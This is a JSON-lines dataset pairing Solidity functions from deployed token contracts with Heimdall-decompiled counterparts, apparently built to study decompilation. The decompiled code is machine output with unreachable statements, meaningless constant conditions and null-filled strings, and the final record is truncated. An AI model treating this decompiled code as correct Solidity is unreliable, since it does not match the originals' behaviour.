{"contract_address": "0xfC37E6b475e0522fc5B8FBc319dB80a4555B5AeD", "original_solidity_code": "function getTokenInfo(uint256 _pid) public view returns (address) {\\n        TokenInfo storage tokens = AllowedCrypto[_pid];\\n        IERC20 paytoken;\\n        paytoken = tokens.paytoken;\\n        return address(paytoken); //Return the contract balance\\n    }", "heimdall_decompiled_code": "function getTokenInfo(uint256 arg0) public view returns (address) {\n        require(arg0 < store_e);\n        var_a = 0x0b;\n        uint256 var_b = address(storage_map_f[arg0 * 0x02]);\n        return address(storage_map_f[arg0 * 0x02]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n    }"}
{"contract_address": "0xa5f88146Cff0673fCea44A32ddB845302c835619", "original_solidity_code": "function updateBuy(\r\n        uint256 _devFee,\r\n        uint256 _liquidityFee,\r\n        uint256 _marketingFee\r\n    ) external onlyOwner {\r\n        buyDevFee = _devFee;\r\n        buyLiquidityFee = _liquidityFee;\r\n        buyMarketingFee = _marketingFee;\r\n        buyTotalFees = buyDevFee + buyLiquidityFee + buyMarketingFee;\r\n        require(buyTotalFees <= 100);\r\n    }", "heimdall_decompiled_code": "function updateBuy(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_s = arg0;\n        store_t = arg1;\n        store_u = arg2;\n        require(!arg0 > (arg1 + arg0));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0x134B57Ea092B770b73b3B0566e50d9059cc7393d", "original_solidity_code": "function removeLimits() external onlyOwner {\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize = _tTotal;\r\n        transferDelay = false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x05f5e100) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x05f5e100;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x05f5e100) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x05f5e100;\n                        transferDelay = uint248(transferDelay);\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x05f5e100) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x05f5e100;\n                                emit MaxTxAmountUpdated(0x05f5e100);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xEaE65155951A1B2D3Ca8C6fc19194583233B57f4", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x20C7b73Be0B1AD179Db94e5b0AC9aD86fa0f068c", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"SafeMath: multiplication overflow\");\n        require(address(arg0) - 0, \"SafeMath: multiplication overflow\");\n        require(arg1 > 0, \"SafeMath: multiplication overflow\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(!(address(arg0)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(store_b > store_c, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_d == ((arg1 * store_d) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_d) / arg1) == store_d, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_f / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_g / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        address var_a = address(tx.origin);\n        var_n = 0x05;\n        require(storage_map_h[var_a] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x49;\n        var_l = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_n = 0x05;\n        storage_map_h[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_d) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(storage_map_h[var_a] > (storage_map_h[var_a] + ((arg1 * store_d) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(storage_map_h[var_a] + ((arg1 * store_d) / 0x64) < storage_map_h[var_a]), \"SafeMath: addition overflow\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_n = 0x01;\n        storage_map_h[var_a] = storage_map_h[var_a] + ((arg1 * store_d) / 0x64);\n        uint256 var_j = (arg1 * store_d) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_d) / 0x64);\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        var_e = 0x40 + var_e;\n        var_j = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_h[var_a] - arg1) > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        storage_map_h[var_a] = storage_map_h[var_a] - arg1;\n        var_e = 0x40 + var_e;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_d) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_p = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_u = var_e.length;\n        uint256 var_v = 0;\n        var_w = var_m;\n        var_v = 0;\n        if (!(arg1 - ((arg1 * store_d) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n            if (storage_map_h[var_a] > _maxTaxSwap) {\n            }\n            if (!store_b > store_j) {\n            }\n            if (!storage_map_h[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_g / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_b > store_l) {\n                if (arg1 - 0) {\n                }\n                require(!((arg1 - ((arg1 * store_d) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_b > store_l, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x19;\n        var_l = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_f / 0x01))) {\n            if (address(arg0) == (address(store_f / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x172F7a6F8C76321376cf077c4b68f6C0A0907d2f", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_i[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x9BF903014c2dbD36f8818eBfc7D840B2cDB6A25b", "original_solidity_code": "function name() external pure returns (string memory);\r\n\r\n    function symbol() external pure returns (string memory);\r\n\r\n    function decimals() external pure returns (uint8);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address owner) external view returns (uint256);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n\r\n    function nonces(address owner) external view returns (uint256);\r\n\r\n    function permit(\r\n        address owner,\r\n        address spender,\r\n        uint256 value,\r\n        uint256 deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) external;\r\n\r\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\r\n    event Burn(\r\n        address indexed sender,\r\n        uint256 amount0,\r\n        uint256 amount1,\r\n        address indexed to\r\n    );\r\n    event Swap(\r\n        address indexed sender,\r\n        uint256 amount0In,\r\n        uint256 amount1In,\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\r\n\r\n    function factory() external view returns (address);\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function token1() external view returns (address);\r\n\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (\r\n            uint112 reserve0,\r\n            uint112 reserve1,\r\n            uint32 blockTimestampLast\r\n        );\r\n\r\n    function price0CumulativeLast() external view returns (uint256);\r\n\r\n    function price1CumulativeLast() external view returns (uint256);\r\n\r\n    function kLast() external view returns (uint256);\r\n\r\n    function mint(address to) external returns (uint256 liquidity);\r\n\r\n    function burn(address to)\r\n        external\r\n        returns (uint256 amount0, uint256 amount1);\r\n\r\n    function swap(\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address to,\r\n        bytes calldata data\r\n    ) external;\r\n\r\n    function skim(address to) external;\r\n\r\n    function sync() external;\r\n\r\n    function initialize(address, address) external;\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        returns (\r\n            uint256 amountA,\r\n            uint256 amountB,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_z) {\n            if (!(store_z) == ((store_z >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_z >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_z >> 0x01;\n                if (store_z) {\n                    if (!(store_z) == ((store_z >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_z >> 0x01) {\n                            if (0x1f < (store_z >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_e[var_a];\n                                if ((0x20 + var_c) + (store_z >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x122B0769A36fBe22EE9FF866fdF7012C9697569e", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                        return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x33743F9E4bf0A323807Fc1517Bb9aD9557585f48", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x30045aA941FF9Be1d2D3603A75207C07860d4156", "original_solidity_code": "function setMaxTransactionAmount(uint256 percent) public virtual onlyOwner {\\r\\n        maxTransactionAmount = (totalSupply() * percent) / TAX_DIVISOR;\\r\\n    }", "heimdall_decompiled_code": "function setMaxTransactionAmount(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((arg0 == ((arg0 * totalSupply) / totalSupply)) | !totalSupply);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        maxTransactionAmount = (arg0 * totalSupply) / 0x2710;\n    }"}
{"contract_address": "0x243aA7135A82d62dc6847C1Ad5A2E7c87c01502d", "original_solidity_code": "function enableTrading() external onlyOwner {\r\n        tradingActive = true;\r\n        swapEnabled = true;\r\n    }", "heimdall_decompiled_code": "function enableTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        tradingActive = (0x01 * 0x0100) | (uint248(tradingActive));\n        tradingActive = (0x01 * 0x010000) | (uint248(tradingActive));\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function approve(address to, uint256 tokenId) external payable;\\n\\n    /**\\n     * @dev Approve or remove `operator` as an operator for the caller.\\n     * Operators can call {transferFrom}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(0x01 > arg1, CustomError_df2d9b42());\n        require(!(arg1 < totalSupply), CustomError_df2d9b42());\n        uint256 var_a = arg1;\n        var_b = 0x04;\n        require(bytes1(storage_map_n[var_a]), CustomError_df2d9b42());\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        require(storage_map_n[var_a], CustomError_cfb3b942());\n        require(address(storage_map_n[var_a]) == msg.sender, CustomError_cfb3b942());\n        var_a = address(storage_map_n[var_a]);\n        var_b = 0x07;\n        var_a = address(msg.sender);\n        uint256 var_b = keccak256(var_a);\n        require(bytes1(storage_map_n[var_a]), CustomError_cfb3b942());\n        var_a = arg1;\n        var_b = 0x06;\n        storage_map_n[var_a] = (address(arg0)) | (uint96(storage_map_n[var_a]));\n        emit Approval(address(storage_map_n[var_a]), address(arg0), arg1);\n        var_c = 0xcfb3b94200000000000000000000000000000000000000000000000000000000;\n        var_a = arg1;\n        var_b = 0x06;\n        storage_map_n[var_a] = (address(arg0)) | (uint96(storage_map_n[var_a]));\n        emit Approval(address(storage_map_n[var_a]), address(arg0), arg1);\n        var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg1;\n        var_b = 0x04;\n        if (storage_map_n[var_a]) {\n            var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg1);\n            var_b = 0x04;\n            if (storage_map_n[var_a]) {\n                var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg1));\n                var_b = 0x04;\n                if (storage_map_n[var_a]) {\n                }\n            }\n        }\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x00BCB434254797479bade33e1eF0aEBDB3F27089", "original_solidity_code": "function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        if (address(msg.sender)) {\n            if (address(arg0)) {\n                if (0 - arg1) {\n                    if (!uniswapV2Router / 0x01000000000000000000000000000000000000000000) {\n                        if (address(owner) == (address(arg0))) {\n                            require(address(msg.sender), \"Trading is currently disabled.\");\n                            require(address(arg0), \"Trading is currently disabled.\");\n                            address var_a = address(msg.sender);\n                            var_b = 0x17;\n                            var_a = address(arg0);\n                            var_a = address(msg.sender);\n                            var_b = 0x12;\n                            require(0 - arg1, \"Trading is currently disabled.\");\n                            require(!(bytes1(uniswapV2Router / 0x01000000000000000000000000000000000000000000)), \"Trading is currently disabled.\");\n                            store_j = uint224(store_j);\n                            require(address(owner) == (address(arg0)), \"Trading is currently disabled.\");\n                            store_j = (bytes1(getBaseSellFees / 0x0100000000000000) * 0x01000000) | (uint248(0x010000 * (bytes1(getBaseSellFees / 0x010000000000))) | (uint240((bytes1(getBaseSellFees / 0x01000000) * 0x0100) | (store_j | (bytes1(getBaseSellFees / 0x0100))))));\n                            require(!(!(address(uniswapV2Router)) == (address(arg0))), \"Trading is currently disabled.\");\n                            store_j = (0x01000000 * (bytes1(getBaseSellFees / 0x01000000000000))) | (uint248(bytes1(getBaseSellFees / 0x0100000000) * 0x010000) | (uint240((bytes1(getBaseSellFees / 0x010000) * 0x0100) | (store_j | (bytes1(getBaseSellFees))))));\n                            var_a = address(arg0);\n                            var_b = 0x16;\n                            require(!(!(address(arg0)) == 0xa91600aff9321f2c2816a4c57c3d8f4d13d66a6c), \"Trading is currently disabled.\");\n                            var_a = address(arg0);\n                            var_b = 0x16;\n                            var_a = address(arg0);\n                            var_b = 0x16;\n                            storage_map_b[var_a] = storage_map_b[var_a];\n                            require(!(!bytes1(storage_map_b[var_a])), \"Trading is currently disabled.\");\n                            require(!(!bytes1(storage_map_b[var_a])), \"Trading is currently disabled.\");\n                            require(!(bytes1(storage_map_b[var_a])), \"Trading is currently disabled.\");\n                            require(!(bytes1(storage_map_b[var_a])), \"Trading is currently disabled.\");\n                            require(!(!bytes1(storage_map_b[var_a])), \"Trading is currently disabled.\");\n                            require(!(!bytes1(storage_map_b[var_a])), \"Trading is currently disabled.\");\n                            require(!(address(arg0)), \"Trading is currently disabled.\");\n                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_c = 0x11;\n                            require(!(!0xdead == (address(arg0))), \"Trading is currently disabled.\");\n                            require(!(!0xdead == (address(arg0))), \"Trading is currently disabled.\");\n                            var_a = address(msg.sender);\n                            var_b = 0x16;\n                            require(!(!0xdead == (address(arg0))), \"Trading is currently disabled.\");\n                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_c = 0x11;\n                            require(!(bytes1(store_j / 0x0100) + (bytes1(store_j)) > 0xff), \"Trading is currently disabled.\");\n                            require(!(!bytes1(storage_map_b[var_a])), \"Trading is currently disabled.\");\n                            require(!(!bytes1(storage_map_b[var_a])), \"Trading is currently disabled.\");\n                        }\n                    }\n                }\n                var_a = address(arg0);\n                var_b = 0x01;\n                require(!((storage_map_b[var_a] - store_n) > storage_map_b[var_a]), \"Trading is currently disabled.\");\n            }\n        }\n        require(bytes1(uniswapV2Router / 0x010000000000000000000000000000000000000000), \"Trading is currently disabled.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x1e;\n        var_g = 